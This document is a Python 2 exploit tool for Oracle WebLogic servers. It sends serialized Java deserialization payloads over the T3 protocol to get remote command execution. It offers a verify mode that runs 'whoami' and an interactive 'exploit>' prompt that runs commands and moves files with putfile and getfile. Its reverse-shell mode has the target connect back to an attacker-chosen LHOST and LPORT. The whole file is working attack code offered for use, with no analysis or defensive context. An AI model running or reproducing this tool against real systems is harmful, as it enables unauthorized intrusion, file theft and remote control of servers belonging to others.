#!/usr/bin/env python
#-*- coding:utf-8 -*-
import socket
import sys
import struct
import subprocess
import argparse


class WeblogicExp:
    def __init__(self):
        self.__platform = 'win' if sys.platform.startswith('win') else 'linux'
        self.__java_shell = 'java -jar shellApp.jar '
        self.__java_genPayload = 'java -jar genPayload.jar '
  
    def __get_payload_bin(self,payload_type, os_type):
        host_platform_name = 'Windows' if os_type == 'win' else 'Linux'
        payload_file = 'payload_bin/payload_%s_%s.bin' % (
            host_platform_name, payload_type)
        with open(payload_file, 'rb') as f:
            return f.read()


    def __t3_send(self,payload_bin):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server_address = (self.__host, self.__port)
            # print 'connecting to %s port %s' % server_address
            sock.connect(server_address)
            # Send headers
            headers = 't3 12.2.1\nAS:255\nHL:19\nMS:10000000\nPU:t3://us-l-breens:7001\n\n'
            # print 'sending Hello'
            sock.sendall(headers)
            data = sock.recv(1024)
            #print >>sys.stderr, 'received "%s"' % data
            if not data.startswith('HELO'):
                if self.__verbose:
                    print 'te_send exception: receive HELO fail!'
                return False

            payload = '\x01\x65\x01\xff\xff\xff\xff\xff\xff\xff\xff\x00\x00\x00\x71\x00\x00\xea\x60\x00\x00\x00\x18\x43\x2e\xc6\xa2\xa6\x39\x85\xb5\xaf\x7d\x63\xe6\x43\x83\xf4\x2a\x6d\x92\xc9\xe9\xaf\x0f\x94\x72\x02\x79\x73\x72\x00\x78\x72\x01\x78\x72\x02\x78\x70\x00\x00\x00\x0c\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x70\x70\x70\x70\x70\x70\x00\x00\x00\x0c\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x70\x06\xfe\x01\x00\x00\xac\xed\x00\x05\x73\x72\x00\x1d\x77\x65\x62\x6c\x6f\x67\x69\x63\x2e\x72\x6a\x76\x6d\x2e\x43\x6c\x61\x73\x73\x54\x61\x62\x6c\x65\x45\x6e\x74\x72\x79\x2f\x52\x65\x81\x57\xf4\xf9\xed\x0c\x00\x00\x78\x70\x72\x00\x24\x77\x65\x62\x6c\x6f\x67\x69\x63\x2e\x63\x6f\x6d\x6d\x6f\x6e\x2e\x69\x6e\x74\x65\x72\x6e\x61\x6c\x2e\x50\x61\x63\x6b\x61\x67\x65\x49\x6e\x66\x6f\xe6\xf7\x23\xe7\xb8\xae\x1e\xc9\x02\x00\x09\x49\x00\x05\x6d\x61\x6a\x6f\x72\x49\x00\x05\x6d\x69\x6e\x6f\x72\x49\x00\x0b\x70\x61\x74\x63\x68\x55\x70\x64\x61\x74\x65\x49\x00\x0c\x72\x6f\x6c\x6c\x69\x6e\x67\x50\x61\x74\x63\x68\x49\x00\x0b\x73\x65\x72\x76\x69\x63\x65\x50\x61\x63\x6b\x5a\x00\x0e\x74\x65\x6d\x70\x6f\x72\x61\x72\x79\x50\x61\x74\x63\x68\x4c\x00\x09\x69\x6d\x70\x6c\x54\x69\x74\x6c\x65\x74\x00\x12\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x3b\x4c\x00\x0a\x69\x6d\x70\x6c\x56\x65\x6e\x64\x6f\x72\x71\x00\x7e\x00\x03\x4c\x00\x0b\x69\x6d\x70\x6c\x56\x65\x72\x73\x69\x6f\x6e\x71\x00\x7e\x00\x03\x78\x70\x77\x02\x00\x00\x78\xfe\x01\x00\x00'
            payload = payload + payload_bin
            payload = payload + \
                '\xfe\x01\x00\x00\xac\xed\x00\x05\x73\x72\x00\x1d\x77\x65\x62\x6c\x6f\x67\x69\x63\x2e\x72\x6a\x76\x6d\x2e\x43\x6c\x61\x73\x73\x54\x61\x62\x6c\x65\x45\x6e\x74\x72\x79\x2f\x52\x65\x81\x57\xf4\xf9\xed\x0c\x00\x00\x78\x70\x72\x00\x21\x77\x65\x62\x6c\x6f\x67\x69\x63\x2e\x63\x6f\x6d\x6d\x6f\x6e\x2e\x69\x6e\x74\x65\x72\x6e\x61\x6c\x2e\x50\x65\x65\x72\x49\x6e\x66\x6f\x58\x54\x74\xf3\x9b\xc9\x08\xf1\x02\x00\x07\x49\x00\x05\x6d\x61\x6a\x6f\x72\x49\x00\x05\x6d\x69\x6e\x6f\x72\x49\x00\x0b\x70\x61\x74\x63\x68\x55\x70\x64\x61\x74\x65\x49\x00\x0c\x72\x6f\x6c\x6c\x69\x6e\x67\x50\x61\x74\x63\x68\x49\x00\x0b\x73\x65\x72\x76\x69\x63\x65\x50\x61\x63\x6b\x5a\x00\x0e\x74\x65\x6d\x70\x6f\x72\x61\x72\x79\x50\x61\x74\x63\x68\x5b\x00\x08\x70\x61\x63\x6b\x61\x67\x65\x73\x74\x00\x27\x5b\x4c\x77\x65\x62\x6c\x6f\x67\x69\x63\x2f\x63\x6f\x6d\x6d\x6f\x6e\x2f\x69\x6e\x74\x65\x72\x6e\x61\x6c\x2f\x50\x61\x63\x6b\x61\x67\x65\x49\x6e\x66\x6f\x3b\x78\x72\x00\x24\x77\x65\x62\x6c\x6f\x67\x69\x63\x2e\x63\x6f\x6d\x6d\x6f\x6e\x2e\x69\x6e\x74\x65\x72\x6e\x61\x6c\x2e\x56\x65\x72\x73\x69\x6f\x6e\x49\x6e\x66\x6f\x97\x22\x45\x51\x64\x52\x46\x3e\x02\x00\x03\x5b\x00\x08\x70\x61\x63\x6b\x61\x67\x65\x73\x71\x00\x7e\x00\x03\x4c\x00\x0e\x72\x65\x6c\x65\x61\x73\x65\x56\x65\x72\x73\x69\x6f\x6e\x74\x00\x12\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x3b\x5b\x00\x12\x76\x65\x72\x73\x69\x6f\x6e\x49\x6e\x66\x6f\x41\x73\x42\x79\x74\x65\x73\x74\x00\x02\x5b\x42\x78\x72\x00\x24\x77\x65\x62\x6c\x6f\x67\x69\x63\x2e\x63\x6f\x6d\x6d\x6f\x6e\x2e\x69\x6e\x74\x65\x72\x6e\x61\x6c\x2e\x50\x61\x63\x6b\x61\x67\x65\x49\x6e\x66\x6f\xe6\xf7\x23\xe7\xb8\xae\x1e\xc9\x02\x00\x09\x49\x00\x05\x6d\x61\x6a\x6f\x72\x49\x00\x05\x6d\x69\x6e\x6f\x72\x49\x00\x0b\x70\x61\x74\x63\x68\x55\x70\x64\x61\x74\x65\x49\x00\x0c\x72\x6f\x6c\x6c\x69\x6e\x67\x50\x61\x74\x63\x68\x49\x00\x0b\x73\x65\x72\x76\x69\x63\x65\x50\x61\x63\x6b\x5a\x00\x0e\x74\x65\x6d\x70\x6f\x72\x61\x72\x79\x50\x61\x74\x63\x68\x4c\x00\x09\x69\x6d\x70\x6c\x54\x69\x74\x6c\x65\x71\x00\x7e\x00\x05\x4c\x00\x0a\x69\x6d\x70\x6c\x56\x65\x6e\x64\x6f\x72\x71\x00\x7e\x00\x05\x4c\x00\x0b\x69\x6d\x70\x6c\x56\x65\x72\x73\x69\x6f\x6e\x71\x00\x7e\x00\x05\x78\x70\x77\x02\x00\x00\x78\xfe\x00\xff\xfe\x01\x00\x00\xac\xed\x00\x05\x73\x72\x00\x13\x77\x65\x62\x6c\x6f\x67\x69\x63\x2e\x72\x6a\x76\x6d\x2e\x4a\x56\x4d\x49\x44\xdc\x49\xc2\x3e\xde\x12\x1e\x2a\x0c\x00\x00\x78\x70\x77\x46\x21\x00\x00\x00\x00\x00\x00\x00\x00\x00\x09\x31\x32\x37\x2e\x30\x2e\x31\x2e\x31\x00\x0b\x75\x73\x2d\x6c\x2d\x62\x72\x65\x65\x6e\x73\xa5\x3c\xaf\xf1\x00\x00\x00\x07\x00\x00\x1b\x59\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\x00\x78\xfe\x01\x00\x00\xac\xed\x00\x05\x73\x72\x00\x13\x77\x65\x62\x6c\x6f\x67\x69\x63\x2e\x72\x6a\x76\x6d\x2e\x4a\x56\x4d\x49\x44\xdc\x49\xc2\x3e\xde\x12\x1e\x2a\x0c\x00\x00\x78\x70\x77\x1d\x01\x81\x40\x12\x81\x34\xbf\x42\x76\x00\x09\x31\x32\x37\x2e\x30\x2e\x31\x2e\x31\xa5\x3c\xaf\xf1\x00\x00\x00\x00\x00\x78'
            payloadLength = len(payload) + 4
            temp = struct.pack('>I', payloadLength)
            payload = temp + payload
            #payload = '\x00\x00\x09\xf1'+payload
            # print 'sending payload...length:%s' %len(payload)
            sock.send(payload)
            # print "send OK!"

            sock.close()
            return True

        except Exception, e:
            if self.__verbose:
                print "t3_send exception:%s" % e
            return False


    def __shell_send(self,cmd):
        run_cmd = '%s %s %s %s %s' % (self.__java_shell, self.__host, self.__port, self.__os_type,cmd)
        app = subprocess.Popen(run_cmd, shell=True, stdout=subprocess.PIPE)
        app.wait()

        return app.stdout.read()


    def __weblogic_connect(self):
        #
        if self.__verbose:
            print "sending upload payload..."
        payload_upload_inst = self.__get_payload_bin('upload_inst', self.__os_type)
        if not self.__t3_send(payload_upload_inst):
            return False
        #
        if self.__verbose:
            print "sending install payload..."
        payload_inst = self.__get_payload_bin('inst', self.__os_type)
        if not self.__t3_send(payload_inst):
            return False
        #
        return True


    def __weblogic_disconn(self):
        #
        if self.__verbose:
            print "sending upload payload..."
        payload_upload_uninst = self.__get_payload_bin('upload_uninst', self.__os_type)
        if not self.__t3_send(payload_upload_uninst):
            return False
        #
        if self.__verbose:
            print "sending uninstall payload..."
        payload_uninst = self.__get_payload_bin('uninst', self.__os_type)
        if not self.__t3_send(payload_uninst):
            return False
        #
        if self.__verbose:
            print "sending delete payload..."
        payload_delete = self.__get_payload_bin('delete', self.__os_type)
        if not self.__t3_send(payload_delete):
            return False
        #
        return True


    def __host_connect_test(self):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            server_address = (self.__host, self.__port)
            if self.__verbose:
                print 'connecting to %s port %s...' % server_address
            sock.connect(server_address)
            sock.close()
        except Exception, e:
            if self.__verbose:
                print "connection fail:%s" % e
            return False

        return True

    def __host_weblogic_helo_test(self):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server_address = (self.__host, self.__port)
            # print 'connecting to %s port %s' % server_address
            sock.connect(server_address)
            # Send headers
            headers = 't3 12.2.1\nAS:255\nHL:19\nMS:10000000\nPU:t3://us-l-breens:7001\n\n'
            # print 'sending Hello'
            sock.sendall(headers)
            data = sock.recv(1024)
            #print >>sys.stderr, 'received "%s"' % data
            if not data.startswith('HELO'):
                if self.__verbose:
                    print 'te_send exception: receive HELO fail!'
                return False

            sock.close()
            return True

        except Exception, e:
            if self.__verbose:
                print "t3_send exception:%s" % e
            return False

    def __verify(self):
        if not self.__weblogic_connect():
            return False
        if self.__verbose:
            print 'execute "whoami"...'
            print '-'*40
        result = self.__shell_send("whoami")
        print result
        if self.__verbose:
            print '-'*40

        self.__weblogic_disconn()

        return True


    def __exploit(self):
        if not self.__weblogic_connect():
            return False
        if self.__verbose:
            print 'execute "whoami"...'
            print '-'*40
        result = self.__shell_send("whoami")
        print result
        if self.__verbose:
            print '-'*40

        while True:
            try:
                cmd = raw_input("exploit>")
                if cmd == 'quit' or cmd == 'exit':
                    break
                if not cmd.startswith('putfile ') and not cmd.startswith('getfile '):
                    cmd = '" %s "' %cmd

                result = self.__shell_send(cmd)
                print result
            except KeyboardInterrupt, e:
                break

        self.__weblogic_disconn()

    def __reverse_shell(self):
        #
        if self.__verbose:
            print "sending upload payload..."
        payload_upload = self.__get_payload_bin('upload_reverse', self.__os_type)
        if not self.__t3_send(payload_upload):
            return False
        ##
        if self.__verbose:
            print "generate reverse payload..."
        run_cmd = '%s %s reverse %s %s ' % (self.__java_genPayload, self.__os_type,self.__LHOST,self.__LPORT)
        #print run_cmd
        app = subprocess.Popen(run_cmd, shell=True, stdout=subprocess.PIPE)
        app.wait()
        if self.__verbose:
            print app.stdout.read()
            print "sending reverse payload..."

        payload = self.__get_payload_bin('reverse', self.__os_type)
        if not self.__t3_send(payload):
            return False
        #
        return True

    def __get_args(self):
        parser = argparse.ArgumentParser()
        parser.add_argument('-u','--host',help='weblogic host',required=True)
        parser.add_argument('-p','--port',help='host port',required=True)
        parser.add_argument('-os','--os_type',choices=['win','linux'],help='os type',required=True)
        parser.add_argument('-t','--exp_type',choices=['verify','exploit','reverse_shell'],help='exploit type; verify to check the vul,the exploit mode can run cmd and get the result',required=True)
        parser.add_argument('--LHOST',help='reverse shell to the host ip')
        parser.add_argument('--LPORT',help='reverse shell to host port')
        parser.add_argument('--silent',action="store_true",default=False,help="don't show the verbose message")
        args = parser.parse_args()

        self.__host = args.host
        self.__port = int(args.port)
        self.__os_type = args.os_type
        self.__exp_type = args.exp_type
        self.__verbose = True if not args.silent else False
        if self.__exp_type == 'reverse_shell':
            if args.LHOST is None or args.LPORT is None:
                print 'Please set the reverse shell LHOST and LPORT!'
                return False
            self.__LHOST = args.LHOST
            self.__LPORT = args.LPORT

        return True


    def run(self):
        if not self.__get_args():
            return 

        if not self.__host_connect_test():
            if self.__verbose:
                print 'connect to server fail!'
            return
        if not self.__host_weblogic_helo_test():
            if self.__verbose:
                print 'receive HELO data fail!'
            return
        if self.__exp_type == 'verify':
            print self.__verify()
        elif self.__exp_type == 'exploit':
            self.__exploit()
        elif self.__exp_type == 'reverse_shell':
            self.__reverse_shell()
        
        if self.__verbose:
            print 'done...'

def main():
    app = WeblogicExp()
    app.run()
    
if __name__ == '__main__':
    main()
